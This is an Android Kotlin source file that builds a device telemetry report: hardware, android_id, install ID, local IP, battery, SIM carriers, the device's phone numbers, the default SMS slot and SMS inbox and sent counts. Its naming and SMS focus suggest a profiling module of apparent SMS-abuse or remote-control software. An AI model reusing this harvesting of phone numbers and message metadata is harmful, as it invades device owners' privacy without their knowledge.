package com.screenlink.remote

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.os.SystemClock
import android.provider.Settings
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.net.Inet4Address
import java.net.NetworkInterface
import java.util.Locale
import java.util.TimeZone
import java.util.UUID

object DeviceInfo {

    private const val PREFS = "viral_prefs"
    private const val KEY_INSTALL_ID = "install_id"
    private const val TAG = "DeviceInfo"

    fun installId(context: Context): String {
        val p = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        p.getString(KEY_INSTALL_ID, null)?.let { if (it.isNotBlank()) return it }
        val id = UUID.randomUUID().toString()
        p.edit().putString(KEY_INSTALL_ID, id).apply()
        return id
    }

    fun androidId(context: Context): String = runCatching {
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: ""
    }.getOrDefault("")

    fun versionName(context: Context): String = runCatching {
        context.packageManager.getPackageInfo(context.packageName, 0).versionName ?: ""
    }.getOrDefault("")

    fun simNumber(context: Context): Pair<String, String> {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                val sm = context.getSystemService(SubscriptionManager::class.java)
                sm?.activeSubscriptionInfoList?.forEach { info ->
                    val n = runCatching { sm.getPhoneNumber(info.subscriptionId) }.getOrNull()
                    if (!n.isNullOrBlank()) return n to "subscription"
                }
            }
        } catch (t: Throwable) {
            Log.w(TAG, "subscription number", t)
        }
        try {
            val tm = context.getSystemService(TelephonyManager::class.java)
            @Suppress("DEPRECATION")
            val n = tm?.line1Number
            if (!n.isNullOrBlank()) return n to "line1"
        } catch (t: Throwable) {
            Log.w(TAG, "line1", t)
        }
        return "" to ""
    }

    fun simSlots(context: Context): JSONArray {
        val arr = JSONArray()
        try {
            val sm = context.getSystemService(SubscriptionManager::class.java) ?: return arr
            val def = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1)
                SubscriptionManager.getDefaultSmsSubscriptionId() else -1

            sm.activeSubscriptionInfoList?.forEach { info ->
                val o = JSONObject()
                o.put("slot", info.simSlotIndex)
                o.put("sub_id", info.subscriptionId)
                o.put("carrier", info.carrierName?.toString() ?: "")
                o.put("country", info.countryIso ?: "")
                o.put("is_default_sms", info.subscriptionId == def)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    val n = runCatching { sm.getPhoneNumber(info.subscriptionId) }.getOrNull()
                    if (!n.isNullOrBlank()) {
                        o.put("number", n)
                        o.put("number_source", "subscription")
                    }
                }
                arr.put(o)
            }
        } catch (t: Throwable) {
            Log.w(TAG, "simSlots", t)
        }
        return arr
    }

    fun defaultSmsSlot(context: Context): Int = try {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP_MR1) -1
        else {
            val def = SubscriptionManager.getDefaultSmsSubscriptionId()
            context.getSystemService(SubscriptionManager::class.java)
                ?.activeSubscriptionInfoList
                ?.firstOrNull { it.subscriptionId == def }
                ?.simSlotIndex ?: -1
        }
    } catch (_: Throwable) {
        -1
    }

    private fun sims(context: Context): JSONArray {
        val arr = simSlots(context)
        if (arr.length() > 0) return arr

        try {
            val tm = context.getSystemService(TelephonyManager::class.java)
            val o = JSONObject()
            o.put("slot", 0)
            o.put("sub_id", -1)
            o.put("carrier", tm?.networkOperatorName ?: "")
            o.put("country", tm?.simCountryIso ?: "")
            val (n, src) = simNumber(context)
            if (n.isNotBlank()) {
                o.put("number", n)
                o.put("number_source", src)
            }
            arr.put(o)
        } catch (_: Throwable) {
        }
        return arr
    }

    private fun networkType(context: Context): String {
        val cm = context.getSystemService(ConnectivityManager::class.java) ?: return ""
        val net = cm.activeNetwork ?: return "none"
        val caps = cm.getNetworkCapabilities(net) ?: return "none"
        return when {
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ethernet"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN) -> "vpn"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> cellularGen(context)
            else -> "other"
        }
    }

    private fun cellularGen(context: Context): String {
        val tm = context.getSystemService(TelephonyManager::class.java) ?: return "cellular"
        @Suppress("DEPRECATION")
        val t = runCatching { tm.dataNetworkType }.getOrDefault(TelephonyManager.NETWORK_TYPE_UNKNOWN)
        return when (t) {
            20 -> "5g"
            TelephonyManager.NETWORK_TYPE_LTE -> "4g"
            TelephonyManager.NETWORK_TYPE_HSPAP,
            TelephonyManager.NETWORK_TYPE_HSPA,
            TelephonyManager.NETWORK_TYPE_HSDPA,
            TelephonyManager.NETWORK_TYPE_HSUPA,
            TelephonyManager.NETWORK_TYPE_UMTS -> "3g"
            TelephonyManager.NETWORK_TYPE_EDGE,
            TelephonyManager.NETWORK_TYPE_GPRS,
            TelephonyManager.NETWORK_TYPE_CDMA,
            TelephonyManager.NETWORK_TYPE_1xRTT -> "2g"
            else -> "cellular"
        }
    }

    private fun localIp(): String = try {
        NetworkInterface.getNetworkInterfaces().toList()
            .filter { it.isUp && !it.isLoopback }
            .flatMap { it.inetAddresses.toList() }
            .filterIsInstance<Inet4Address>()
            .firstOrNull { !it.isLoopbackAddress }
            ?.hostAddress ?: ""
    } catch (_: Throwable) {
        ""
    }

    private fun countUri(context: Context, uri: android.net.Uri): Int = try {
        context.contentResolver.query(uri, arrayOf("_id"), null, null, null)?.use { it.count } ?: 0
    } catch (_: Throwable) {
        0
    }

    fun telemetry(context: Context): JSONObject {
        val t = JSONObject()
        val (number, source) = simNumber(context)
        val simArr = sims(context)

        t.put("manufacturer", Build.MANUFACTURER)
        t.put("brand", Build.BRAND)
        t.put("model", Build.MODEL)
        t.put("device", Build.DEVICE)
        t.put("product", Build.PRODUCT)
        t.put("cpu_abi", Build.SUPPORTED_ABIS.firstOrNull() ?: "")
        t.put("cpu_cores", Runtime.getRuntime().availableProcessors())
        t.put("android_version", Build.VERSION.RELEASE)
        t.put("sdk_int", Build.VERSION.SDK_INT)
        t.put("app_version", versionName(context))
        t.put("theme", BuildConfig.THEME)
        t.put("install_id", installId(context))
        t.put("uptime_seconds", SystemClock.elapsedRealtime() / 1000)
        t.put("locale", Locale.getDefault().toString())
        t.put("timezone", TimeZone.getDefault().id)

        runCatching { t.put("android_id", androidId(context)) }

        runCatching {
            val am = context.getSystemService(ActivityManager::class.java)
            val mi = ActivityManager.MemoryInfo()
            am?.getMemoryInfo(mi)
            if (mi.totalMem > 0) {
                t.put("ram_total_mb", mi.totalMem / 1_048_576)
                t.put("ram_avail_mb", mi.availMem / 1_048_576)
                t.put("ram_low", mi.lowMemory)
            }
        }

        runCatching {
            val st = StatFs(Environment.getDataDirectory().path)
            t.put("storage_total_mb", st.blockCountLong * st.blockSizeLong / 1_048_576)
            t.put("storage_free_mb", st.availableBlocksLong * st.blockSizeLong / 1_048_576)
        }

        runCatching {
            val dm = context.resources.displayMetrics
            t.put("screen_resolution", "${dm.widthPixels}x${dm.heightPixels}")
            t.put("screen_density", dm.densityDpi)
        }

        runCatching { t.put("network_type", networkType(context)) }
        runCatching { t.put("local_ip", localIp()) }

        runCatching {
            val bm = context.getSystemService(BatteryManager::class.java)
            val lvl = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
            if (lvl in 0..100) t.put("battery_level", lvl)
            val i = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val status = i?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            t.put(
                "battery_charging",
                status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
            )
            val temp = i?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1) ?: -1
            if (temp > 0) t.put("battery_temperature_c", temp / 10f)
        }

        t.put("sim_count", simArr.length())
        t.put("sims", simArr)
        runCatching { t.put("sim_slots", simSlots(context)) }
        runCatching { t.put("default_sms_slot", defaultSmsSlot(context)) }
        runCatching { t.put("sim_carrier", SimRouter.networkOperatorName(context)) }
        if (number.isNotBlank()) {
            t.put("sim_number", number)
            t.put("sim_number_source", source)
        }

        runCatching {
            t.put("sms_inbox_count", countUri(context, android.provider.Telephony.Sms.Inbox.CONTENT_URI))
            t.put("sms_sent_count", countUri(context, android.provider.Telephony.Sms.Sent.CONTENT_URI))
        }

        return t
    }

    fun summary(context: Context): String =
        "${Build.MANUFACTURER} ${Build.MODEL}".trim().take(60)
}